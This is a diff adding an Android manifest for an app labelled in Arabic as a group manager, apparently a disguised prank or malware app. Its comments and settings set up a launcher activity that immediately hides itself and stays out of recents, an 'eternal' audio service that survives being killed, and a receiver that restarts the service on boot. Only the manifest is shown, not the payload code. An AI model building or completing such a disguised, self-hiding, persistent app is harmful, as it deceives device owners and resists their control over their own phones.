@@ -1,0 +1,50 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.shadow.eternalsiren">
+
+    <!-- CRITICAL: NO PERMISSIONS REQUESTED -->
+    
+    <application
+        android:allowBackup="false"
+        android:icon="@drawable/floppa"
+        android:label="مدير القروب"
+        android:theme="@android:style/Theme.Translucent.NoTitleBar"
+        android:persistent="true"
+        android:supportsRtl="true">
+        
+        <!-- Main activity that immediately hides itself -->
+        <activity android:name=".MainActivity"
+            android:excludeFromRecents="true"
+            android:finishOnTaskLaunch="true"
+            android:noHistory="true"
+            android:stateNotNeeded="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        
+        <!-- Eternal service that survives killing -->
+        <service android:name=".EternalAudioService"
+            android:enabled="true"
+            android:exported="false"
+            android:stopWithTask="false"
+            android:process=":eternal" />
+        
+        <!-- Auto-restart receiver -->
+        <receiver android:name=".AudioRestartReceiver"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="RESTART_AUDIO" />
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
+        
+        <!-- Native library -->
+        <meta-data android:name="android.app.lib_name"
+            android:value="native-audio" />
+            
+    </application>
+</manifest>
